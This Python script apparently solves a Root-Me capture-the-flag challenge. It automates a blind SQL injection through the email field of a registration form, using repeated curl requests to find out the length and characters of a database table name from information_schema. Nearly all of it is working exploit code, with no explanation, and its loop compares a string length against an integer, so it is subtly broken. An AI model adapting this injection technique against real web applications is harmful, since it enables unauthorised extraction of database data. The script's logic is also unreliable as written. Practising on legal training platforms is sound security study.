#!/usr/bin/python

import os
import re

def urlencode(s):
	ignoreList = list('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_')
	acc = ''
	for c in s:
		if c in ignoreList:
			acc += c
		else:
			acc += '%' + hex(ord(c))[2:]
	return acc

# Get length of table_name
print('Getting length of table_name')
email = urlencode("' + LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1)) + '")
print(email)
user = 878
s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
while 'user exist' in s.lower():
	user += 1
	s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()

s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=login -d 'username={0}&password=a'".format(user)).read()
table_name_len = re.match('(.*\n)*.*Email : (\d+).*', s).group(2)
print('Table name length: {0}'.format(table_name_len))

# Get table_name
print('Getting table_name')
user += 1
print('user = {0}'.format(user))
tryList = list('abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_')
i = 0
tableName = ''
while i < table_name_len:
	c = 32
	while c < 127:
		print(c,chr(c))
		email = urlencode("{0}' < (SELECT table_name FROM information_schema.tables LIMIT 1) + '".format(tableName+chr(c)))
		s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
		while 'user exist' in s.lower():
			user += 1
			print('user = {0}'.format(user))
			s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
		s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=login -d 'username={0}&password=a'".format(user)).read()
		print(s)
		try:
			if s:
				result = re.match('(.*\n)*.*Email : (\d+).*', s).group(2)
		except AttributeError:
			print('erreur:' + s)
			exit()
		if result == '0':
			tableName += chr(c)
			#print(list(tableName))
			break
		else:
			c += 1
	i += 1

print(user)
